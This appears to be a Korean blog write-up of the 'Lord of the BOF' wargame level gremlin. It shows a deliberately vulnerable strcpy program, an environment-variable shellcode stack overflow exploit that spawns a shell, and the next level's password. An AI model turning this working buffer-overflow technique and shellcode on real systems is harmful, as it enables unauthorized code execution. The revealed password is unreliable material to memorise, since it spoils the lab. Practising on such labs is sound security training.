---
layout: post
title: "Hackerschool LOB-gremlin"
categories: [Hackerschool-LOB]
tags: [pwnable]
redirect_from:
 - /2019/07/24/
---
```bash
login: gremlin
Password:
[gremlin@localhost gremlin]$ ls
cobolt  cobolt.c
[gremlin@localhost gremlin]$ cat cobolt.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer
*/

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}

```
gremlin/hello bof world로 접속하자.
이번에는 버퍼 크기가 굉장히 작다.
쉘 코드를 버퍼 안에 넣어서는 풀 수 없다.
이번에는 환경변수를 사용해야겠다.
```bash
[gremlin@localhost gremlin]$ export code=$(python -c 'print"\x90"*2000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
```
환경변수의 주소를 찾자.
```bash
[gremlin@localhost tmp]$ cat find.c
int main()
{
        printf("%x\n",getenv("code"));
}
[gremlin@localhost tmp]$ ./find
bffff2ff
````
환경변수의 주소:bffff2ff
이제 RET를 환경변수의 주소로 덮자.
```bash
[gremlin@localhost gremlin]$ ./cobolt $(python -c 'print"\x90"*20+"\xff\xf2\xff\xbf"')
릱릱릱릱릱릱릱릱릱릱??
bash$ my-pass
euid = 502
hacking exposed
```
성공이다.
gremlin's password:hacking exposed
